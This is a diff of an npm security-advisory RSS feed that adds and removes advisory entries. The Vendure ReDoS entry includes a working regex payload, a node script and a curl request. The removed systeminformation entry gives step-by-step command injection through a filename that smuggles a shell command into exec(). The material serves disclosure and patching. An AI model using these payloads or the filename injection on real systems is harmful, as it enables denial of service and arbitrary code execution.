@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-09-25T14:16:40.835Z</updated>
+    <updated>2026-09-25T19:00:40.527Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,210 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@vendure/core] Vendure: Unauthenticated ReDoS via `regex` filter on SQLite backends]]></title>
+        <id>https://github.com/advisories/GHSA-jgm3-qmp2-c4p7</id>
+        <link href="https://github.com/advisories/GHSA-jgm3-qmp2-c4p7"/>
+        <updated>2026-09-25T17:31:08.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<blockquote>
+<p>[!IMPORTANT] 
+Only instances running on the SQLite driver (better-sqlite3) are affected; SQLite is usually used in development/testing backend, so production deployments on PostgreSQL or MySQL/MariaDB are unaffected.</p>
+</blockquote>
+<p>The <code>StringOperators.regex</code> filter exposed on the public Shop GraphQL API is evaluated inside the Node.js event loop via a synchronous SQLite user-defined function (UDF). Supplying a catastrophically backtracking pattern blocks the entire event loop, causing a complete denial of service with no authentication required.</p>
+<hr>
+<h3 id="details">Details</h3>
+<p>Vendure registers a JavaScript UDF so that SQLite can handle the <code>REGEXP</code> operator:</p>
+<p><strong><code>packages/core/src/service/helpers/list-query-builder/list-query-builder.ts</code> lines 917–931</strong></p>
+<pre><code class="language-ts">private registerSQLiteRegexpFunction() {
+    const regexpFn = (pattern: string, value: string) =&gt; {
+        const result = new RegExp(`${pattern}`, 'i').test(value);  // user-controlled pattern
+        return result ? 1 : 0;
+    };
+    if (dbType === 'better-sqlite3') {
+        driver.databaseConnection.function('regexp', regexpFn);
+    }
+    if (dbType === 'sqljs') {
+        driver.databaseConnection.create_function('regexp', regexpFn);
+    }
+}
+</code></pre>
+<p>The <code>pattern</code> argument is the raw value of <code>StringOperators.regex</code> submitted by the caller. No length limit, timeout, or safe-regex validation is applied before constructing <code>new RegExp(pattern)</code>.</p>
+<p><strong><code>packages/core/src/service/helpers/list-query-builder/parse-filter-params.ts</code> lines 321–325</strong></p>
+<pre><code class="language-ts">case 'regex':
+    return {
+        clause: getRegexpClause(fieldName, argIndex, dbType),
+        parameters: { [`arg${argIndex}`]: operand },  // operand = raw user input
+    };
+</code></pre>
+<p>The <code>products</code> resolver in <code>packages/core/src/api/resolvers/shop/shop-products.resolver.ts</code> carries <strong>no <code>@Allow</code> decorator</strong>, and the access control strategy treats an empty permission set as publicly accessible:</p>
+<p><strong><code>packages/core/src/config/auth/default-entity-access-control-strategy.ts</code> lines 49–52</strong></p>
+<pre><code class="language-ts">async canAccess(ctx: RequestContext, permissions: Permission[]): Promise&lt;boolean&gt; {
+    if (permissions.length === 0) {
+        return true;   // no @Allow → public
+    }
+    ...
+}
+</code></pre>
+<p>The three conditions together — user-controlled regex, synchronous JS UDF on the event loop, unauthenticated access — create a complete unauthenticated DoS path.</p>
+<p>Affected database drivers: <code>better-sqlite3</code>, <code>sqljs</code>.<br>MySQL/MariaDB and PostgreSQL delegate the pattern to the database engine (those engines have their own exposure characteristics but do not block the Node.js event loop).</p>
+<hr>
+<h3 id="poc">PoC</h3>
+<img width="1610" height="458" alt="image" src="https://github.com/user-attachments/assets/327f3847-79d9-43e2-859e-47a753e61b2b">
+[poc.zip](https://github.com/user-attachments/files/28752976/poc.zip)
+[poc-redos.js](https://github.com/user-attachments/files/28753000/poc-redos.js)
+
+<p><strong>Prerequisites:</strong> Node.js ≥ 18. No account, no server, no dependencies.</p>
+<p><strong>Step 1 — save the following as <code>poc-redos.js</code>:</strong></p>
+<pre><code class="language-js">// Exact code from list-query-builder.ts:918-919
+const PATTERN = '(a+)+$';
+const VALUE   = 'a'.repeat(28) + 'b';
+console.log('[*] pattern:', PATTERN, '  value:', VALUE);
+console.log('[*] Starting (server would be unresponsive from this point)...');
+const start = Date.now();
+const result = new RegExp(`${PATTERN}`, 'i').test(VALUE);
+console.log('[+] elapsed:', Date.now() - start, 'ms  result:', result);
+</code></pre>
+<p><strong>Step 2 — run it:</strong></p>
+<pre><code class="language-cmd">node poc-redos.js
+</code></pre>
+<p><strong>Expected output (verified on Node.js v24.14.0):</strong></p>
+<pre><code>[*] pattern: (a+)+$   value: aaaaaaaaaaaaaaaaaaaaaaaaaaaab
+[*] Starting (server would be unresponsive from this point)...
+[+] elapsed: 19755 ms  result: false
+</code></pre>
+<p>A 29-character input causes ~20 seconds of CPU spin. Inside a live Vendure server this same code runs synchronously in the SQLite UDF on the Node.js event loop — the process cannot handle any other request for the entire duration.</p>
+<p><strong>Step 3 — GraphQL payload (against a running Vendure instance with <code>better-sqlite3</code> or <code>sqljs</code> driver):</strong></p>
+<pre><code class="language-cmd">curl -s -X POST http://localhost:3000/shop-api -H "Content-Type: application/json" -d "{\"query\":\"{ products(options:{filter:{name:{regex:\\\"(a+)+$\\\"}}}) { items { id } } }\"}" --max-time 60
+</code></pre>
+<p><em>No test account is needed. The <code>products</code> query is publicly accessible.</em></p>
+<hr>
+<h3 id="impact">Impact</h3>
+<p><strong>Vulnerability type:</strong> Regular Expression Denial of Service (ReDoS)</p>
+<p><strong>Who is impacted:</strong></p>
+<ul>
+<li>Any Vendure deployment running with a <code>better-sqlite3</code> or <code>sqljs</code> database driver (typical for development environments and single-server small deployments created via <code>@vendure/create</code>).</li>
+<li>Any unauthenticated internet user can trigger the attack — no credentials, no API key, no session.</li>
+<li>A single malicious HTTP request blocks the Node.js event loop, making the entire storefront and admin panel unresponsive until the regex engine times out (which may take tens of seconds to minutes depending on the host CPU and pattern chosen).</li>
+<li>Repeated requests constitute a sustained DoS requiring no more bandwidth than a single HTTP request per CPU-second.</li>
+</ul>
+<hr>
+<h3 id="fix">Fix</h3>
+<ol>
+<li><p><strong>Validate the regex before constructing it.</strong> Reject patterns that are known to cause catastrophic backtracking using a safe-regex library (e.g. <code>safe-regex2</code> or <code>recheck</code>) before passing them to <code>new RegExp()</code>.</p>
+</li>
+<li><p><strong>Enforce a maximum pattern length.</strong> Reject <code>StringOperators.regex</code> values exceeding a reasonable limit (e.g. 100 characters) at the GraphQL validation layer.</p>
+</li>
+<li><p><strong>Run the UDF in a worker thread.</strong> Move <code>regexpFn</code> off the main event loop by executing it in a <code>worker_threads</code> context with an <code>AbortSignal</code> timeout so a hung regex cannot block the server.</p>
+</li>
+<li><p><strong>Require authentication for filtered list queries.</strong> Add <code>@Allow(Permission.Authenticated)</code> to <code>ShopProductsResolver.products</code> (and other filterable list queries) if anonymous product browsing is not a business requirement, as a defence-in-depth measure.</p>
+</li>
+</ol>
+<hr>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vendurehq/vendure/security/advisories/GHSA-jgm3-qmp2-c4p7">https://github.com/vendurehq/vendure/security/advisories/GHSA-jgm3-qmp2-c4p7</a></li>
+<li><a href="https://github.com/vendurehq/vendure/commit/f74cbbb0b9a50b5b0131822835fe7ee9b71b42c9">https://github.com/vendurehq/vendure/commit/f74cbbb0b9a50b5b0131822835fe7ee9b71b42c9</a></li>
+<li><a href="https://github.com/vendurehq/vendure/releases/tag/v3.6.5">https://github.com/vendurehq/vendure/releases/tag/v3.6.5</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63460">https://nvd.nist.gov/vuln/detail/CVE-2026-63460</a></li>
+<li><a href="https://github.com/advisories/GHSA-jgm3-qmp2-c4p7">https://github.com/advisories/GHSA-jgm3-qmp2-c4p7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jgm3-qmp2-c4p7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-17T14:49:56.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[knowns] Duplicate Advisory: Knowns Unrestricted Path Traversal leading to out-of-bounds arbitrary .md file read, write, and deletion in MCP Docs + Memory Tools]]></title>
+        <id>https://github.com/advisories/GHSA-qjrq-cvv4-3g9w</id>
+        <link href="https://github.com/advisories/GHSA-qjrq-cvv4-3g9w"/>
+        <updated>2026-09-25T17:25:52.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of GHSA-9gfj-28hw-jchp. This link is maintained to preserve external references.</p>
+<h2 id="original-advisory">Original Advisory</h2>
+<p>knowns versions before 0.30.0 fail to validate filesystem paths in MCP tool arguments, allowing attackers to read, create, overwrite and delete files outside the project directory. Attackers can supply path arguments containing directory traversal sequences to access arbitrary Markdown files accessible to the server process.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/knowns-dev/knowns/security/advisories/GHSA-9gfj-28hw-jchp">https://github.com/knowns-dev/knowns/security/advisories/GHSA-9gfj-28hw-jchp</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-86439">https://nvd.nist.gov/vuln/detail/CVE-2026-86439</a></li>
+<li><a href="https://github.com/knowns-dev/knowns/commit/09c5a96fd5817b941dc86669278c1a17db10ed4e">https://github.com/knowns-dev/knowns/commit/09c5a96fd5817b941dc86669278c1a17db10ed4e</a></li>
+<li><a href="https://github.com/knowns-dev/knowns/blob/v0.29.1/internal/storage/doc_store.go#L124-L129">https://github.com/knowns-dev/knowns/blob/v0.29.1/internal/storage/doc_store.go#L124-L129</a></li>
+<li><a href="https://github.com/knowns-dev/knowns/blob/v0.29.1/internal/storage/memory_store.go#L203-L211">https://github.com/knowns-dev/knowns/blob/v0.29.1/internal/storage/memory_store.go#L203-L211</a></li>
+<li><a href="https://github.com/knowns-dev/knowns/releases/tag/v0.30.0">https://github.com/knowns-dev/knowns/releases/tag/v0.30.0</a></li>
+<li><a href="https://www.vulncheck.com/advisories/knowns-before-0.30.0-path-traversal-via-mcp-doc-and-memory-tools">https://www.vulncheck.com/advisories/knowns-before-0.30.0-path-traversal-via-mcp-doc-and-memory-tools</a></li>
+<li><a href="https://github.com/advisories/GHSA-qjrq-cvv4-3g9w">https://github.com/advisories/GHSA-qjrq-cvv4-3g9w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qjrq-cvv4-3g9w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-08T00:30:22.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[knowns] Duplicate Advisory: Knowns Sandbox Escape: Unauthenticated Header Injection Grants AI Agent Unrestricted Access to Host Filesystem]]></title>
+        <id>https://github.com/advisories/GHSA-w47m-jpv2-qfw5</id>
+        <link href="https://github.com/advisories/GHSA-w47m-jpv2-qfw5"/>
+        <updated>2026-09-25T17:11:38.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
+<p>This advisory has been withdrawn because it is a duplicate of GHSA-9h2q-r9fh-f98w. This link is maintained to preserve external references.</p>
+<h3 id="original-description">Original Description</h3>
+<p>knowns versions before 0.31.0 fail to properly validate the x-opencode-directory request header in the /api/opencode proxy endpoint. Remote attackers can supply arbitrary directory paths to execute file operations outside the project root on the host system.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/knowns-dev/knowns/security/advisories/GHSA-9h2q-r9fh-f98w">https://github.com/knowns-dev/knowns/security/advisories/GHSA-9h2q-r9fh-f98w</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-88899">https://nvd.nist.gov/vuln/detail/CVE-2026-88899</a></li>
+<li><a href="https://github.com/knowns-dev/knowns/commit/37db0561b37b48b8bd035a417d7f1da6258ae657">https://github.com/knowns-dev/knowns/commit/37db0561b37b48b8bd035a417d7f1da6258ae657</a></li>
+<li><a href="https://github.com/knowns-dev/knowns/blob/v0.30.0/internal/server/server.go#L1283-L1296">https://github.com/knowns-dev/knowns/blob/v0.30.0/internal/server/server.go#L1283-L1296</a></li>
+<li><a href="https://github.com/knowns-dev/knowns/releases/tag/v0.31.0">https://github.com/knowns-dev/knowns/releases/tag/v0.31.0</a></li>
+<li><a href="https://www.vulncheck.com/advisories/knowns-before-0.31.0-external-control-of-agent-working-directory-via-x-opencode-directory-header">https://www.vulncheck.com/advisories/knowns-before-0.31.0-external-control-of-agent-working-directory-via-x-opencode-directory-header</a></li>
+<li><a href="https://github.com/advisories/GHSA-w47m-jpv2-qfw5">https://github.com/advisories/GHSA-w47m-jpv2-qfw5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w47m-jpv2-qfw5</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-09-10T18:31:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[parse-server] Parse Server's GraphQL WebSocket endpoint bypasses security middleware]]></title>
+        <id>https://github.com/advisories/GHSA-p2x3-8689-cwpg</id>
+        <link href="https://github.com/advisories/GHSA-p2x3-8689-cwpg"/>
+        <updated>2026-09-25T14:19:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Any Parse Server deployment that uses the GraphQL API is affected. The GraphQL WebSocket endpoint for subscriptions does not pass requests through the Express middleware chain that enforces authentication, introspection control, and query complexity limits. An attacker can connect to the WebSocket endpoint and execute GraphQL operations without providing a valid application or API key, access the GraphQL schema via introspection even when public introspection is disabled, and send arbitrarily complex queries that bypass configured complexity limits.</p>
+<h3 id="patches">Patches</h3>
+<p>The unfinished GraphQL WebSocket subscription feature has been removed, including the <code>createSubscriptions</code> method and the <code>subscriptions-transport-ws</code> dependency. GraphQL subscriptions were never functional in Parse Server as the schema did not define any subscription types.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Block WebSocket upgrade requests to the GraphQL subscriptions path (by default <code>/subscriptions</code>) at the network level, for example using a reverse proxy or load balancer rule.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-p2x3-8689-cwpg">https://github.com/parse-community/parse-server/security/advisories/GHSA-p2x3-8689-cwpg</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10189">https://github.com/parse-community/parse-server/pull/10189</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10190">https://github.com/parse-community/parse-server/pull/10190</a></li>
+<li><a href="https://github.com/parse-community/parse-server/commit/21330d146c68b57a930a58b8a8cd9fbf09436cf3">https://github.com/parse-community/parse-server/commit/21330d146c68b57a930a58b8a8cd9fbf09436cf3</a></li>
+<li><a href="https://github.com/parse-community/parse-server/commit/3ffba757bfc836bd034e1369f4f64304e110e375">https://github.com/parse-community/parse-server/commit/3ffba757bfc836bd034e1369f4f64304e110e375</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32594">https://nvd.nist.gov/vuln/detail/CVE-2026-32594</a></li>
+<li><a href="https://github.com/advisories/GHSA-p2x3-8689-cwpg">https://github.com/advisories/GHSA-p2x3-8689-cwpg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p2x3-8689-cwpg</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-13T20:04:44.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[cline] Cline: Cross-Origin WebSocket Hijacking in Cline Hub Dashboard (`/browser` endpoint)]]></title>
         <id>https://github.com/advisories/GHSA-3cj3-hqcr-g934</id>
@@ -1956,302 +2160,5 @@ Error [ERR_UNHANDLED_ERROR]: Unhandled error. (undefined)
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2024-06-19T15:04:41.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[systeminformation] Command Injection via Unsanitized `locate` Output in `versions()` — systeminformation]]></title>
-        <id>https://github.com/advisories/GHSA-5vv4-hvf7-2h46</id>
-        <link href="https://github.com/advisories/GHSA-5vv4-hvf7-2h46"/>
-        <updated>2026-09-24T14:41:16.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="command-injection-via-unsanitized-locate-output-in-versions--systeminformation">Command Injection via Unsanitized <code>locate</code> Output in <code>versions()</code> — systeminformation</h1>
-<p><strong>Package:</strong> systeminformation (npm)<br><strong>Tested Version:</strong> 5.30.7<br><strong>Affected Platform:</strong> Linux<br><strong>Author:</strong> Sebastian Hildebrandt<br><strong>Weekly Downloads:</strong> ~5,000,000+<br><strong>Repository:</strong> <a href="https://github.com/sebhildebrandt/systeminformation">https://github.com/sebhildebrandt/systeminformation</a><br><strong>Severity:</strong> Medium<br><strong>CWE:</strong> CWE-78 (OS Command Injection)  </p>
-<hr>
-<h3 id="the-vulnerable-code-path">The Vulnerable Code Path</h3>
-<p>Inside the <code>versions()</code> function, when detecting the PostgreSQL version on Linux, the code does this:</p>
-<pre><code class="language-javascript">// lib/osinfo.js — lines 770-776
-
-exec('locate bin/postgres', (error, stdout) =&gt; {
-  if (!error) {
-    const postgresqlBin = stdout.toString().split('\n').sort();
-    if (postgresqlBin.length) {
-      exec(postgresqlBin[postgresqlBin.length - 1] + ' -V', (error, stdout) =&gt; {
-        // parses version string...
-      });
-    }
-  }
-});
-</code></pre>
-<p>Here's what happens step by step:</p>
-<ol>
-<li>It runs <code>locate bin/postgres</code> to search the filesystem for PostgreSQL binaries</li>
-<li>It splits the output by newline and sorts the results alphabetically</li>
-<li>It takes the <strong>last element</strong> (highest alphabetically)</li>
-<li>It concatenates that path directly into a new <code>exec()</code> call with <code>+ ' -V'</code></li>
-</ol>
-<p><strong>No <code>sanitizeShellString()</code>. No path validation. No <code>execFile()</code>. Raw string concatenation into <code>exec()</code>.</strong></p>
-<p>The <code>locate</code> command reads from a system-wide database (<code>plocate.db</code> or <code>mlocate.db</code>) that indexes all filenames on the system. If any indexed filename contains shell metacharacters — specifically semicolons — those characters will be interpreted by the shell when passed to <code>exec()</code>.</p>
-<hr>
-<h2 id="exploitation">Exploitation</h2>
-<h3 id="prerequisites">Prerequisites</h3>
-<p>For this vulnerability to be exploitable, the following conditions must be met:</p>
-<ol>
-<li><strong>Target system runs Linux</strong> — the vulnerable code path is inside an <code>if (_linux)</code> block</li>
-<li><strong><code>locate</code> / <code>plocate</code> is installed</strong> — common on Ubuntu, Debian, Fedora, RHEL</li>
-<li><strong>PostgreSQL binary exists in the locate database</strong> — so <code>locate bin/postgres</code> returns results (otherwise the code falls through to a safe <code>psql -V</code> fallback)</li>
-<li><strong>The attacker can create files on the filesystem</strong> — in any directory that gets indexed by <code>updatedb</code></li>
-<li><strong>The locate database gets updated</strong> — <code>updatedb</code> runs daily via systemd timer (<code>plocate-updatedb.timer</code>) or cron on most distros</li>
-</ol>
-<h3 id="step-1--verify-the-environment">Step 1 — Verify the Environment</h3>
-<p>On the target machine, confirm locate is available and running:</p>
-<pre><code>which locate
-# /usr/bin/locate
-
-systemctl list-timers | grep plocate
-# plocate-updatedb.timer    plocate-updatedb.service
-# (runs daily, typically around 1-2 AM)
-</code></pre>
-<p>Check who owns the locate database:</p>
-<pre><code>ls -la /var/lib/plocate/plocate.db
-# -rw-r----- 1 root plocate 18851616 Feb 14 01:50 /var/lib/plocate/plocate.db
-</code></pre>
-<p>Database is root-owned and updated by root. Regular users cannot update it directly, but <code>updatedb</code> runs on a daily schedule and indexes all readable files.</p>
-<h3 id="step-2--craft-the-malicious-file-path">Step 2 — Craft the Malicious File Path</h3>
-<p>The key insight is that <strong>Linux allows semicolons in filenames</strong>, and <code>exec()</code> passes strings through <code>/bin/sh -c</code> which <strong>interprets semicolons as command separators</strong>.</p>
-<p>Create a file whose path contains an injected command:</p>
-<pre><code>mkdir -p "/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin"
-touch "/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres"
-</code></pre>
-<p>Verify it exists:</p>
-<pre><code>find /var/tmp -name postgres
-# /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres
-</code></pre>
-<p>This file needs to end up in the <code>locate</code> database. On a real system, this happens automatically when <code>updatedb</code> runs overnight. For testing purposes:</p>
-<pre><code>sudo updatedb
-</code></pre>
-<p>Then verify locate picks it up:</p>
-<pre><code>locate bin/postgres
-# /usr/lib/postgresql/14/bin/postgres
-# /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres
-</code></pre>
-<h3 id="step-3--understand-the-sort-trick">Step 3 — Understand the Sort Trick</h3>
-<p>The vulnerable code sorts the locate results alphabetically and takes the <strong>last</strong> element:</p>
-<pre><code class="language-javascript">const postgresqlBin = stdout.toString().split('\n').sort();
-exec(postgresqlBin[postgresqlBin.length - 1] + ' -V', ...);
-</code></pre>
-<p>Alphabetically, <code>/var/</code> sorts <strong>after</strong> <code>/usr/</code>. So our malicious path naturally becomes the selected one:</p>
-<pre><code>Node.js sort order:
-  [0] /usr/lib/postgresql/14/bin/postgres   ← legitimate
-  [1] /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres   ← selected (last)
-</code></pre>
-<p>Quick verification:</p>
-<pre><code>node -e "
-const paths = [
-  '/usr/lib/postgresql/14/bin/postgres',
-  '/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres'
-];
-console.log('Sorted:', paths.sort());
-console.log('Selected (last):', paths[paths.length - 1]);
-"
-</code></pre>
-<p>Output:</p>
-<pre><code>Sorted: [
-  '/usr/lib/postgresql/14/bin/postgres',
-  '/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres'
-]
-Selected (last): /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres
-</code></pre>
-<h3 id="step-4--trigger-the-vulnerability">Step 4 — Trigger the Vulnerability</h3>
-<p>Now when any application using systeminformation calls <code>versions()</code> requesting the postgresql version, the injected command fires:</p>
-<pre><code class="language-javascript">const si = require('systeminformation');
-
-// This is a normal, innocent API call
-si.versions('postgresql').then(data =&gt; {
-  console.log(data);
-});
-</code></pre>
-<p>Internally, the library builds and executes this command:</p>
-<pre><code>/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres -V
-</code></pre>
-<p>The shell (<code>/bin/sh -c</code>) interprets this as three separate commands:</p>
-<pre><code>/var/tmp/x                         →  fails silently (not executable)
-touch /tmp/SI_RCE_PROOF            →  ATTACKER'S COMMAND EXECUTES
-/bin/postgres -V                   →  runs normally, returns version
-</code></pre>
-<h3 id="step-5--verify-code-execution">Step 5 — Verify Code Execution</h3>
-<pre><code>ls -la /tmp/SI_RCE_PROOF
-# -rw-rw-r-- 1 appuser appuser 0 Feb 14 15:30 /tmp/SI_RCE_PROOF
-</code></pre>
-<p>The file exists. Arbitrary command execution confirmed.</p>
-<p>The injected command runs with <strong>whatever privileges the Node.js process has</strong>. In a monitoring dashboard or backend API context, that's typically the application service account.</p>
-<hr>
-<h2 id="real-world-attack-scenarios">Real-World Attack Scenarios</h2>
-<h3 id="scenario-1--shared-hosting--multi-tenant-server">Scenario 1 — Shared Hosting / Multi-Tenant Server</h3>
-<p>A low-privileged user on a shared server creates the malicious file in <code>/tmp</code> or their home directory. The hosting provider runs a monitoring agent that uses <code>systeminformation</code> for health dashboards. Next time the agent calls <code>versions()</code>, the attacker's command executes under the monitoring agent's (higher-privileged) service account.</p>
-<h3 id="scenario-2--cicd-pipeline-poisoning">Scenario 2 — CI/CD Pipeline Poisoning</h3>
-<p>A malicious contributor submits a PR that includes a build step creating files with crafted names. If the CI pipeline uses <code>systeminformation</code> for environment reporting (common in test harnesses and build dashboards), the injected commands execute in the CI runner context — potentially leaking secrets, tokens, and deployment keys.</p>
-<h3 id="scenario-3--container--kubernetes-escape">Scenario 3 — Container / Kubernetes Escape</h3>
-<p>In containerized environments where <code>/var</code> or <code>/tmp</code> sits on a shared volume, a compromised container creates the malicious file. When the host-level monitoring agent (running <code>systeminformation</code>) calls <code>versions()</code>, the injected command executes on the host, breaking out of the container boundary.</p>
-<hr>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Replace <code>exec()</code> with <code>execFile()</code> for the PostgreSQL binary version check. <code>execFile()</code> does not spawn a shell, so metacharacters in the path are treated as literal characters:</p>
-<pre><code class="language-javascript">const { execFile } = require('child_process');
-
-exec('locate bin/postgres', (error, stdout) =&gt; {
-  if (!error) {
-    const postgresqlBin = stdout.toString().split('\n')
-      .filter(p =&gt; p.trim().length &gt; 0)
-      .sort();
-    if (postgresqlBin.length) {
-      execFile(postgresqlBin[postgresqlBin.length - 1], ['-V'], (error, stdout) =&gt; {
-        // ... parse version
-      });
-    }
-  }
-});
-</code></pre>
-<p>Additionally, the locate output should be validated against a safe path pattern before use:</p>
-<pre><code class="language-javascript">const safePath = /^[a-zA-Z0-9/_.-]+$/;
-const postgresqlBin = stdout.toString().split('\n')
-  .filter(p =&gt; safePath.test(p.trim()))
-  .sort();
-</code></pre>
-<hr>
-<h2 id="disclosure">Disclosure</h2>
-<ul>
-<li><strong>Reported via:</strong> GitHub Private Security Advisory</li>
-<li><strong>Advisory URL:</strong> <a href="https://github.com/sebhildebrandt/systeminformation/security/advisories/new">https://github.com/sebhildebrandt/systeminformation/security/advisories/new</a></li>
-<li><strong>Security Contact:</strong> <a href="mailto:security@systeminformation.io">security@systeminformation.io</a></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5vv4-hvf7-2h46">https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5vv4-hvf7-2h46</a></li>
-<li><a href="https://github.com/sebhildebrandt/systeminformation/commit/b67d3715eec881038ccbaace2f2711419ac3e107">https://github.com/sebhildebrandt/systeminformation/commit/b67d3715eec881038ccbaace2f2711419ac3e107</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26318">https://nvd.nist.gov/vuln/detail/CVE-2026-26318</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-26318">https://access.redhat.com/security/cve/CVE-2026-26318</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2441124">https://bugzilla.redhat.com/show_bug.cgi?id=2441124</a></li>
-<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-26318.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-26318.json</a></li>
-<li><a href="https://github.com/advisories/GHSA-5vv4-hvf7-2h46">https://github.com/advisories/GHSA-5vv4-hvf7-2h46</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5vv4-hvf7-2h46</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-18T22:36:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[elysia] elysia has Inefficient Algorithmic Complexity and Interpretation Conflict]]></title>
-        <id>https://github.com/advisories/GHSA-9643-4qgh-g8mx</id>
-        <link href="https://github.com/advisories/GHSA-9643-4qgh-g8mx"/>
-        <updated>2026-09-23T21:54:51.000Z</updated>
-        <content type="html"><![CDATA[<p>Elysia v1.4.28 is vulnerable to denial-of-service attacks due to CPU exhaustion in the form data normalization code.</p>
-<p>Elysia uses <code>getAll</code> to retrieve value from FormData. It is called directly relative to the total number of key-value pairs in the form data. The total amount of work the for loop has to do grows quadratically, so doubling the number of unique key-value pairs quadruples the amount of work. In the above PoC, each .getAll call scans through all of the <code>n</code> key-value pairs in the form data. Because there are <code>n</code> unique keys in the form data, there are .getAll calls, so in total the form data normalizer has to scan <code>n</code> x <code>n</code> key-value pairs.</p>
-<h3 id="impact">Impact</h3>
-<p>Endpoints using <code>multipart/form-data</code></p>
-<h3 id="patches">Patches</h3>
-<p>1.4.29</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>no 100% confirm workaround beside updating the patch</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/elysiajs/elysia/security/advisories/GHSA-9643-4qgh-g8mx">https://github.com/elysiajs/elysia/security/advisories/GHSA-9643-4qgh-g8mx</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56669">https://nvd.nist.gov/vuln/detail/CVE-2026-56669</a></li>
-<li><a href="https://github.com/elysiajs/elysia/commit/8358ff9efbcedf9534995f5977f26b9ceab59329">https://github.com/elysiajs/elysia/commit/8358ff9efbcedf9534995f5977f26b9ceab59329</a></li>
-<li><a href="https://gist.github.com/jviide/ea040eabe7bac058326174e2cd42dfd9">https://gist.github.com/jviide/ea040eabe7bac058326174e2cd42dfd9</a></li>
-<li><a href="https://github.com/elysiajs/elysia/releases/tag/1.4.29">https://github.com/elysiajs/elysia/releases/tag/1.4.29</a></li>
-<li><a href="https://github.com/advisories/GHSA-9643-4qgh-g8mx">https://github.com/advisories/GHSA-9643-4qgh-g8mx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9643-4qgh-g8mx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-23T21:54:50.000Z</published>
-    </entry>
-    <entry>
